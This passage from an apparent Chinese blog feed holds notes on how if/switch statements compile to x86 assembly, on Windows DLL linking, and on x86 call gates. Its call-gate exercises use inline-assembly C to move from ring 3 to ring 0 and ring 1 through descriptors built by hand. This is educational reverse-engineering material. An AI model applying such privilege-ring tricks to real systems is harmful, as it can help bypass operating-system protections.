+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    a = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>或许c代码许多人已经烂熟于心了，那就看看汇编代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00401028   mov         dword ptr [ebp-4],0</span><br><span class="line">0040102F   mov         eax,1</span><br><span class="line">00401034   test        eax,eax</span><br><span class="line">00401036   je          main+2Fh (0040103f)</span><br><span class="line">00401038   mov         dword ptr [ebp-4],1</span><br></pre></td></tr></table></figure>
+<p>可以发现if的实现就是对于表达式值的一个比较，当不满足后便用jmp直接跳转</p>
+<p>再来看看if-else语句</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD a = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span>( a == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">	a = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	a = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>c部分就不再多解释，直接跳到汇编</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00401028   mov         dword ptr [ebp-4],0</span><br><span class="line">&#x2F;&#x2F;a变量的值扔进eax</span><br><span class="line"></span><br><span class="line">0040102F   cmp         dword ptr [ebp-4],1</span><br><span class="line">00401033   jne         main+2Eh (0040103e)</span><br><span class="line">&#x2F;&#x2F;与1比较，如果不等于1就跳到else语句处</span><br><span class="line">00401035   mov         dword ptr [ebp-4],1 &#x2F;&#x2F;if语句内的功能语句</span><br><span class="line">0040103C   jmp         main+35h (00401045)</span><br><span class="line">&#x2F;&#x2F;跳出if语句</span><br><span class="line"></span><br><span class="line">0040103E   mov         dword ptr [ebp-4],2&#x2F;&#x2F;else语句内的功能语句</span><br></pre></td></tr></table></figure>
+<p>对于if-else来说依旧是使用判断跳转的方式去处理条件分支，</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">21</span>:       DWORD a = <span class="number">0</span>;</span><br><span class="line"><span class="number">00401028</span>   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">0</span></span><br><span class="line"><span class="number">22</span>:</span><br><span class="line"><span class="number">23</span>:       <span class="keyword">if</span>( a == <span class="number">1</span>)</span><br><span class="line"><span class="number">0040102F</span>   cmp         dword ptr [ebp<span class="number">-4</span>],<span class="number">1</span></span><br><span class="line"><span class="number">00401033</span>   jne         main+<span class="number">53</span>h (<span class="number">00401063</span>)</span><br><span class="line"><span class="number">24</span>:       &#123;</span><br><span class="line"><span class="number">25</span>:           a = <span class="number">1</span>;</span><br><span class="line"><span class="number">00401035</span>   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">1</span></span><br><span class="line"><span class="number">26</span>:           <span class="keyword">if</span>( a == <span class="number">2</span>)</span><br><span class="line"><span class="number">0040103</span>C   cmp         dword ptr [ebp<span class="number">-4</span>],<span class="number">2</span></span><br><span class="line"><span class="number">00401040</span>   jne         main+<span class="number">3B</span>h (<span class="number">0040104b</span>)</span><br><span class="line"><span class="number">27</span>:           &#123;</span><br><span class="line"><span class="number">28</span>:               a = <span class="number">2</span>;</span><br><span class="line"><span class="number">00401042</span>   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">2</span></span><br><span class="line"><span class="number">29</span>:           &#125;</span><br><span class="line"><span class="number">30</span>:           <span class="keyword">else</span> <span class="keyword">if</span>(a == <span class="number">4</span>)</span><br><span class="line"><span class="number">00401049</span>   jmp         main+<span class="number">51</span>h (<span class="number">00401061</span>)</span><br><span class="line"><span class="number">0040104B</span>   cmp         dword ptr [ebp<span class="number">-4</span>],<span class="number">4</span></span><br><span class="line"><span class="number">0040104F</span>   jne         main+<span class="number">4</span>Ah (<span class="number">0040105</span>a)</span><br><span class="line"><span class="number">31</span>:           &#123;</span><br><span class="line"><span class="number">32</span>:               a = <span class="number">4</span>;</span><br><span class="line"><span class="number">00401051</span>   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">4</span></span><br><span class="line"><span class="number">33</span>:           &#125;</span><br><span class="line"><span class="number">34</span>:           <span class="keyword">else</span></span><br><span class="line"><span class="number">00401058</span>   jmp         main+<span class="number">51</span>h (<span class="number">00401061</span>)</span><br><span class="line"><span class="number">35</span>:           &#123;</span><br><span class="line"><span class="number">36</span>:               a = <span class="number">-1</span>;</span><br><span class="line"><span class="number">0040105</span>A   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">0F</span>FFFFFFFh</span><br><span class="line"><span class="number">37</span>:           &#125;</span><br><span class="line"><span class="number">38</span>:       &#125;</span><br><span class="line"><span class="number">39</span>:       <span class="keyword">else</span></span><br><span class="line"><span class="number">00401061</span>   jmp         main+<span class="number">73</span>h (<span class="number">00401083</span>)</span><br><span class="line"><span class="number">40</span>:       &#123;</span><br><span class="line"><span class="number">41</span>:           a = <span class="number">1</span>;</span><br><span class="line"><span class="number">00401063</span>   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">1</span></span><br><span class="line"><span class="number">42</span>:           <span class="keyword">if</span> (a/<span class="number">10</span><span class="number">-2</span>+<span class="number">7</span>)</span><br><span class="line"><span class="number">0040106</span>A   mov         eax,dword ptr [ebp<span class="number">-4</span>]</span><br><span class="line"><span class="number">0040106</span>D   cdq</span><br><span class="line"><span class="number">0040106</span>E   mov         ecx,<span class="number">0</span>Ah</span><br><span class="line"><span class="number">00401073</span>   idiv        eax,ecx</span><br><span class="line"><span class="number">00401075</span>   add         eax,<span class="number">5</span></span><br><span class="line"><span class="number">00401078</span>   test        eax,eax</span><br><span class="line"><span class="number">0040107</span>A   je          main+<span class="number">73</span>h (<span class="number">00401083</span>)</span><br><span class="line"><span class="number">43</span>:           &#123;</span><br><span class="line"><span class="number">44</span>:               a = <span class="number">-1</span>;</span><br><span class="line"><span class="number">0040107</span>C   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">0F</span>FFFFFFFh</span><br><span class="line"><span class="number">45</span>:           &#125;</span><br><span class="line"><span class="number">46</span>:       &#125;</span><br></pre></td></tr></table></figure>
+<h2 id="同样的即使是再复杂的if语句依旧是通过判断跳转的方式进行，判断语句是表达式也是计算出值然后判断跳转，对于不满足条件的便一条一条进行判断跳转，emmm，那就来看看switch语句"><a href="#同样的即使是再复杂的if语句依旧是通过判断跳转的方式进行，判断语句是表达式也是计算出值然后判断跳转，对于不满足条件的便一条一条进行判断跳转，emmm，那就来看看switch语句" class="headerlink" title="同样的即使是再复杂的if语句依旧是通过判断跳转的方式进行，判断语句是表达式也是计算出值然后判断跳转，对于不满足条件的便一条一条进行判断跳转，emmm，那就来看看switch语句"></a>同样的即使是再复杂的if语句依旧是通过判断跳转的方式进行，判断语句是表达式也是计算出值然后判断跳转，对于不满足条件的便一条一条进行判断跳转，emmm，那就来看看switch语句</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">8</span>:        <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="number">00401028</span>   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">0</span>Ah</span><br><span class="line"><span class="number">9</span>:        <span class="keyword">switch</span>(a)</span><br><span class="line"><span class="number">10</span>:       &#123;</span><br><span class="line"><span class="number">0040102F</span>   mov         eax,dword ptr [ebp<span class="number">-4</span>]</span><br><span class="line"><span class="number">00401032</span>   mov         dword ptr [ebp<span class="number">-8</span>],eax</span><br><span class="line"><span class="number">00401035</span>   cmp         dword ptr [ebp<span class="number">-8</span>],<span class="number">0</span></span><br><span class="line"><span class="number">00401039</span>   je          main+<span class="number">39</span>h (<span class="number">00401049</span>)</span><br><span class="line"><span class="number">0040103B</span>   cmp         dword ptr [ebp<span class="number">-8</span>],<span class="number">1</span></span><br><span class="line"><span class="number">0040103F</span>   je          main+<span class="number">48</span>h (<span class="number">00401058</span>)</span><br><span class="line"><span class="number">00401041</span>   cmp         dword ptr [ebp<span class="number">-8</span>],<span class="number">2</span></span><br><span class="line"><span class="number">00401045</span>   je          main+<span class="number">57</span>h (<span class="number">00401067</span>)</span><br><span class="line"><span class="number">00401047</span>   jmp         main+<span class="number">66</span>h (<span class="number">00401076</span>)</span><br><span class="line"><span class="number">11</span>:           <span class="keyword">case</span> <span class="number">0</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401049</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">0040104</span><span class="function">E   call        <span class="title">printf</span> <span class="params">(<span class="number">004010e0</span>)</span></span></span><br><span class="line">00401053   add         esp,4</span><br><span class="line"><span class="number">00401056</span>   jmp         main+<span class="number">73</span>h (<span class="number">00401083</span>)</span><br><span class="line"><span class="number">12</span>:           <span class="keyword">case</span> <span class="number">1</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401058</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">0040105</span><span class="function">D   call        <span class="title">printf</span> <span class="params">(<span class="number">004010e0</span>)</span></span></span><br><span class="line">00401062   add         esp,4</span><br><span class="line"><span class="number">00401065</span>   jmp         main+<span class="number">73</span>h (<span class="number">00401083</span>)</span><br><span class="line"><span class="number">13</span>:           <span class="keyword">case</span> <span class="number">2</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401067</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">0040106</span><span class="function">C   call        <span class="title">printf</span> <span class="params">(<span class="number">004010e0</span>)</span></span></span><br><span class="line">00401071   add         esp,4</span><br><span class="line"><span class="number">00401074</span>   jmp         main+<span class="number">73</span>h (<span class="number">00401083</span>)</span><br><span class="line"><span class="number">14</span>:           <span class="keyword">default</span>:</span><br><span class="line"><span class="number">15</span>:               <span class="built_in">printf</span>(<span class="string">&quot;end\n&quot;</span>);</span><br><span class="line"><span class="number">00401076</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;end\n&quot;</span> (<span class="number">0042001</span>c)</span><br><span class="line"><span class="number">0040107B</span>   <span class="function">call        <span class="title">printf</span> <span class="params">(<span class="number">004010e0</span>)</span></span></span><br><span class="line">00401080   add         esp,4</span><br><span class="line"><span class="number">16</span>:           <span class="keyword">break</span>;</span><br><span class="line"><span class="number">17</span>:       &#125;</span><br></pre></td></tr></table></figure>
+<p>看到这有人可能会说：欸，这也不是比较比较然后跳转吗，不和if一个套路吗？<br>不过当分支一多比如：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">8</span>:        <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="number">00401028</span>   mov         dword ptr [ebp<span class="number">-4</span>],<span class="number">0</span>Ah</span><br><span class="line"><span class="number">9</span>:        <span class="keyword">switch</span>(a)</span><br><span class="line"><span class="number">10</span>:       &#123;</span><br><span class="line"><span class="number">0040102F</span>   mov         eax,dword ptr [ebp<span class="number">-4</span>]</span><br><span class="line"><span class="number">00401032</span>   mov         dword ptr [ebp<span class="number">-8</span>],eax</span><br><span class="line"><span class="number">00401035</span>   cmp         dword ptr [ebp<span class="number">-8</span>],<span class="number">4</span></span><br><span class="line"><span class="number">00401039</span>   ja          $L540+<span class="number">0F</span>h (<span class="number">00401090</span>)</span><br><span class="line"><span class="number">0040103B</span>   mov         ecx,dword ptr [ebp<span class="number">-8</span>]</span><br><span class="line"><span class="number">0040103</span>E   jmp         dword ptr [ecx*<span class="number">4</span>+<span class="number">4010B</span>0h]</span><br><span class="line"><span class="number">11</span>:           <span class="keyword">case</span> <span class="number">0</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401045</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">0040104</span><span class="function">A   call        <span class="title">printf</span> <span class="params">(<span class="number">00401120</span>)</span></span></span><br><span class="line">0040104F   add         esp,4</span><br><span class="line"><span class="number">00401052</span>   jmp         $L540+<span class="number">1</span>Ch (<span class="number">0040109</span>d)</span><br><span class="line"><span class="number">12</span>:           <span class="keyword">case</span> <span class="number">1</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401054</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">00401059</span>   <span class="function">call        <span class="title">printf</span> <span class="params">(<span class="number">00401120</span>)</span></span></span><br><span class="line">0040105E   add         esp,4</span><br><span class="line"><span class="number">00401061</span>   jmp         $L540+<span class="number">1</span>Ch (<span class="number">0040109</span>d)</span><br><span class="line"><span class="number">13</span>:           <span class="keyword">case</span> <span class="number">2</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401063</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">00401068</span>   <span class="function">call        <span class="title">printf</span> <span class="params">(<span class="number">00401120</span>)</span></span></span><br><span class="line">0040106D   add         esp,4</span><br><span class="line"><span class="number">00401070</span>   jmp         $L540+<span class="number">1</span>Ch (<span class="number">0040109</span>d)</span><br><span class="line"><span class="number">14</span>:           <span class="keyword">case</span> <span class="number">3</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401072</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">00401077</span>   <span class="function">call        <span class="title">printf</span> <span class="params">(<span class="number">00401120</span>)</span></span></span><br><span class="line">0040107C   add         esp,4</span><br><span class="line"><span class="number">0040107F</span>   jmp         $L540+<span class="number">1</span>Ch (<span class="number">0040109</span>d)</span><br><span class="line"><span class="number">15</span>:           <span class="keyword">case</span> <span class="number">4</span>: <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>); <span class="keyword">break</span>;</span><br><span class="line"><span class="number">00401081</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;hello\n&quot;</span> (<span class="number">00420024</span>)</span><br><span class="line"><span class="number">00401086</span>   <span class="function">call        <span class="title">printf</span> <span class="params">(<span class="number">00401120</span>)</span></span></span><br><span class="line">0040108B   add         esp,4</span><br><span class="line"><span class="number">0040108</span>E   jmp         $L540+<span class="number">1</span>Ch (<span class="number">0040109</span>d)</span><br><span class="line"><span class="number">16</span>:           <span class="keyword">default</span>:</span><br><span class="line"><span class="number">17</span>:               <span class="built_in">printf</span>(<span class="string">&quot;end\n&quot;</span>);</span><br><span class="line"><span class="number">00401090</span>   push        offset <span class="built_in">string</span> <span class="string">&quot;end\n&quot;</span> (<span class="number">0042001</span>c)</span><br><span class="line"><span class="number">00401095</span>   <span class="function">call        <span class="title">printf</span> <span class="params">(<span class="number">00401120</span>)</span></span></span><br><span class="line">0040109A   add         esp,4</span><br><span class="line"><span class="number">18</span>:           <span class="keyword">break</span>;</span><br><span class="line"><span class="number">19</span>:       &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我们会发现很独特的一行<br><code>0040103E   jmp         dword ptr [ecx*4+4010B0h]</code><br>这是一个计算跳转地址的公式<br>当我们查看<code>4010B0h</code>这个地址时是如下内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004010B0  45 10 40 00  </span><br><span class="line">004010B4  54 10 40 00 </span><br><span class="line">004010B8  63 10 40 00 </span><br><span class="line">004010BC  72 10 40 00 </span><br><span class="line">004010C0  81 10 40 00</span><br></pre></td></tr></table></figure>
+<p>就会发现这是每个case的地址</p>
+<p>将条件分支的跨度再次调大时我们把上面的<code>case 4 :</code> 调整为 <code>case 20 :</code>会发现这样的一个地址映射表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0040B890  00 01 02 03  </span><br><span class="line">0040B894  05 05 05 05  </span><br><span class="line">0040B898  05 05 05 05  </span><br><span class="line">0040B89C  05 05 05 05  </span><br><span class="line">0040B8A0  05 05 05 05  </span><br><span class="line">0040B8A4  04 CC CC CC  </span><br></pre></td></tr></table></figure>
+<p>姑且叫做小表，每个值都代表着对应地址映射表的位置</p>
+<p>再将尺度调大，对于特别大的会进行判断，对于跨度小的还是公式计算，<br>当每一个跨度都特别大而且不连续那就又回到if的判断方式</p>
+]]></content>
+      <tags>
+        <tag>c</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>简单使用链接库</title>
+    <url>/2020/01/20/%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E9%93%BE%E6%8E%A5%E5%BA%93/</url>
+    <content><![CDATA[<h1 id="使用静态链接库"><a href="#使用静态链接库" class="headerlink" title="使用静态链接库"></a>使用静态链接库</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;TestLib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;TestLib.lib&quot;</span>)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">在项目 <span class="built_in">set</span> &gt; link 里添加相应lib文件，需申明头文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>静态链接库:把代码静态编译到exe中，更改lib内容就得重新编译使用</p>
+</blockquote>
+<hr>
+<h1 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h1><h2 id="链接库头文件写法"><a href="#链接库头文件写法" class="headerlink" title="链接库头文件写法"></a>链接库头文件写法</h2><h3 id="使用-declspec-dllexport"><a href="#使用-declspec-dllexport" class="headerlink" title="使用_declspec(dllexport)"></a>使用<code>_declspec(dllexport)</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MyDLL.h</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="keyword">int</span> <span class="title">Func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"><span class="comment">//extern 申明为全局</span></span><br><span class="line"><span class="comment">//&quot;C&quot; 申明以C的语法处理，避免编译器无法判断处理方式把函数魔性改名</span></span><br><span class="line"><span class="comment">//_declspec(dllexport) 申明函数将导出</span></span><br></pre></td></tr></table></figure>
+<h3 id="使用-def"><a href="#使用-def" class="headerlink" title="使用.def"></a>使用<code>.def</code></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//MyDLL.h</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//FuncList.def</span></span><br><span class="line">EXPORT</span><br><span class="line"></span><br><span class="line">Func @<span class="number">12</span> (NONAME)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="引用写法"><a href="#引用写法" class="headerlink" title="引用写法"></a>引用写法</h2><h3 id="隐式链接"><a href="#隐式链接" class="headerlink" title="隐式链接"></a>隐式链接</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;TestDLL.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllimport) <span class="function"><span class="keyword">int</span> <span class="title">Func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="显式链接"><a href="#显式链接" class="headerlink" title="显式链接"></a>显式链接</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*lpFunc)</span><span class="params">(<span class="keyword">int</span>,<span class="keyword">int</span>)</span></span>; <span class="comment">//申明函数指针</span></span><br><span class="line"></span><br><span class="line">	lpFunc myFun; <span class="comment">//创建指针</span></span><br><span class="line"></span><br><span class="line">	HINSTANCE hModule = LoadLibrary(<span class="string">&quot;TestDLL.dll&quot;</span>); <span class="comment">//载入dll</span></span><br><span class="line"></span><br><span class="line">	myFun = (lpFunc)GetProcAddress(hModule, <span class="string">&quot;Func&quot;</span>); <span class="comment">//把指针指向dll内函数的地址</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>笔记</tag>
+        <tag>C</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>调用门笔记</title>
+    <url>/2021/02/04/%E8%B0%83%E7%94%A8%E9%97%A8%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="0x00-调用门概述"><a href="#0x00-调用门概述" class="headerlink" title="0x00 调用门概述"></a>0x00 调用门概述</h1><blockquote>
+<p> 调用门是用来在不同权限级别之间进行跳转，可是平级跳转，也可以是提权跳转</p>
+</blockquote>
+<a id="more"></a>
+
+<h2 id="0x10-描述符"><a href="#0x10-描述符" class="headerlink" title="0x10 描述符"></a>0x10 描述符</h2><p><img src="https://i.loli.net/2021/02/24/EkiOZDcWdCJQbeF.png" alt="image-20210224162142538"></p>
+<p>这是在GDT表中的描述符格式</p>
+<p>例如在3环提权到0环的调用门应该这样构造 <code>XXXXEC00 0008XXXX</code></p>
+<h2 id="0x11-权限检查"><a href="#0x11-权限检查" class="headerlink" title="0x11 权限检查"></a>0x11 权限检查</h2><p>在跳转时也会有权限检查：CPL ≤ call gate DPL; RPL ≤ call gate DPL</p>
+<blockquote>
+<p>这里要注意，在3环提权的时候DPL的值应该是3环的权限，要不然连敲门的权限都没有</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/02/24/mhYM4dovE9fBI7O.png" alt="image-20210224163820289"></p>
+<h2 id="0x12-堆栈变化"><a href="#0x12-堆栈变化" class="headerlink" title="0x12 堆栈变化"></a>0x12 堆栈变化</h2><p>而在用call调用的时候其堆栈变化是</p>
+<p><img src="https://i.loli.net/2021/02/24/U2PvOpbcw7lnYVh.png" alt="image-20210224163419182"></p>
+<p><img src="https://i.loli.net/2021/02/24/o6xHaDpcn4h9g2G.png" alt="image-20210224192554951"></p>
+<p><img src="https://i.loli.net/2021/02/24/4FCcQsH1A7r6mdP.png" alt="image-20210224192644904"></p>
+<p>而含参的平级跳转和也只是和提权含参差不多，只是不把ebp和ss压入堆栈</p>
+<p>而这时候的0环的ebp和ss都是TSS里的值来填充的</p>
+<p>而这种变化的堆栈则要用retf，而retf的pop回去的值没有进行权限检查</p>
+<blockquote>
+<p>retf [参数个数，无则省略]</p>
+</blockquote>
+<h1 id="0x01-练习1"><a href="#0x01-练习1" class="headerlink" title="0x01 练习1"></a>0x01 练习1</h1><p>调用门中调用调用门</p>
+<blockquote>
+<p>3环程序通过调用门进0环，再通过修改堆栈实现任意跳转，再调用调用门，修复堆栈retf回主函数，程序回到3环</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> cs_eip[<span class="number">6</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x48</span>, <span class="number">0</span>&#125;;</span><br><span class="line">DWORD g_esp;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">CallGate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">		<span class="comment">//int 3</span></span><br><span class="line">        pushfd</span><br><span class="line">        pushad</span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov [eax+<span class="number">0x24</span>],<span class="number">0x00401060</span></span><br><span class="line">		mov [eax+<span class="number">0x24</span>+<span class="number">0x4</span>],<span class="number">0x08</span></span><br><span class="line">		mov ebx,dword ptr[eax+<span class="number">0x24</span>+<span class="number">0x8</span>]</span><br><span class="line">		mov g_esp,ebx</span><br><span class="line">		mov [eax+<span class="number">0x24</span>+<span class="number">0x8</span>],esp</span><br><span class="line">		mov [eax+<span class="number">0x24</span>+<span class="number">0x1c</span>],ss</span><br><span class="line">		popad</span><br><span class="line">        popfd</span><br><span class="line">        retf</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">CallGate1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">		<span class="comment">//int 3</span></span><br><span class="line">		mov eax,<span class="number">0x8003f048</span></span><br><span class="line">		mov [eax],<span class="number">0x80</span></span><br><span class="line">		call fword ptr [cs_eip]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">CallGate2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   __asm</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="comment">//	int 3</span></span><br><span class="line">		mov eax,esp</span><br><span class="line">		mov dword ptr[eax],<span class="number">0x004010ce</span></span><br><span class="line">		mov dword ptr[eax+<span class="number">0x4</span>],<span class="number">0x1b</span></span><br><span class="line">		mov ebx,g_esp</span><br><span class="line">		mov [eax+<span class="number">8</span>],ebx</span><br><span class="line">		mov [eax+<span class="number">0x1c</span>],<span class="number">0x23</span></span><br><span class="line">		retf</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        call fword ptr [cs_eip]</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="0x02-练习2"><a href="#0x02-练习2" class="headerlink" title="0x02 练习2"></a>0x02 练习2</h1><p>通过retf进1环</p>
+<blockquote>
+<p>构造1环权限的cs ss 通过retf不进行权限检查来跳转到1环</p>
+</blockquote>
+<p>cs: 00cfbb00`0000ffff  –&gt;  8003f0b0</p>
+<p>ss: 00cfb300`0000ffff  –&gt; 8003f0b8</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__declspec(naked) <span class="function"><span class="keyword">void</span> <span class="title">Func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov eax,<span class="number">0xb1</span></span><br><span class="line">		mov [esp+<span class="number">0x4</span>],eax</span><br><span class="line"></span><br><span class="line">		mov eax,<span class="number">0xB9</span></span><br><span class="line">		mov [esp+<span class="number">0xc</span>],eax</span><br><span class="line"></span><br><span class="line">		retf</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//printf(&quot;%x&quot;,Func);</span></span><br><span class="line">	<span class="keyword">short</span> g_cs1;</span><br><span class="line">	<span class="keyword">char</span> buf[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		call fword ptr [buf]</span><br><span class="line">		mov g_cs1,cs</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,g_cs1);  <span 